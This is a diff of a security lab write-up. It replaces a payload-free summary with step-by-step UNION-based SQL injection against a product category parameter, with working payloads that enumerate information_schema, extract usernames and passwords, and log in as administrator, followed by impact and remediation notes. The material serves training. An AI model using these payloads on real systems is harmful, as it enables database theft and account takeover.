@@ -1,42 +1,55 @@
-# Lab 04: SQL Injection UNION Attack – Finding a Column Containing Text
 
-## Lab Description
-This lab demonstrates a UNION-based SQL injection vulnerability where the attacker must identify which column in the query can display text-based data.
-This step is necessary to extract meaningful information using UNION attacks.
+# SQL injection attack, listing the database contents on non-Oracle databases
 
-## Vulnerability Type
-- SQL Injection
-- UNION-based Injection
+## 1. Vulnerability
 
-## Affected Functionality
-- Product listing page with database-backed filtering
+**SQL Injection — Database Enumeration**
 
-## Root Cause
-The application embeds user-controlled input directly into a SQL query without proper parameterization.
-As a result, attackers can manipulate the query using UNION statements and observe the application’s response.
+The product category parameter allows UNION-based SQL injection, enabling an attacker to enumerate database tables, columns, and user credentials.
 
-## Exploitation Summary (High Level)
-- The SQL query returns multiple columns.
-- Not all columns can display string data.
-- By testing each column with textual input, it is possible to determine which column reflects text in the application response.
-- This enables further UNION-based data extraction.
+## 2. Objective
 
-*(Specific payloads are omitted to keep the write-up educational and responsible.)*
+Enumerate the database structure, retrieve user credentials, and log in as `administrator`.
 
-## Impact
-- Enables retrieval of sensitive database information
-- Facilitates further SQL injection exploitation
-- Increases risk of full database compromise
+## 3. Exploitation
 
-## Remediation
-- Use prepared statements with parameterized queries
-- Enforce strict input validation
-- Avoid displaying raw database query results directly to users
-- Implement proper error handling
+1. Intercept the product category request using Burp Suite.
+2. Determine that the query returns two text-compatible columns:
 
-## Key Takeaway
-Finding a column that can display text is a critical step in UNION-based SQL injection attacks.
-Seemingly minor input handling flaws can lead to serious data exposure risks.
+`'+UNION+SELECT+'abc','def'--`
 
-## Lab Status
-✅ Completed
+3. Enumerate the database tables:
+
+`'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--`
+
+4. Identify the table containing user credentials.
+5. Enumerate its columns:
+
+`'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_abcdef'--`
+
+6. Retrieve the usernames and passwords:
+
+`'+UNION+SELECT+username_abcdef,+password_abcdef+FROM+users_abcdef--`
+
+7. Use the `administrator` password to log in.
+8. Lab solved.
+
+## 4. Impact
+
+Database enumeration through SQL injection can allow attackers to:
+
+* Discover database structure.
+* Retrieve usernames and passwords.
+* Access sensitive application data.
+* Compromise privileged accounts.
+
+## 5. Remediation
+
+* Use **parameterized queries / prepared statements**.
+* Apply least-privilege database permissions.
+* Protect sensitive credential data.
+* Do not expose database errors or internal structure.
+
+## 6. Key Takeaway
+
+**Once SQL injection is achieved, database metadata can be used to systematically discover and extract sensitive information.**
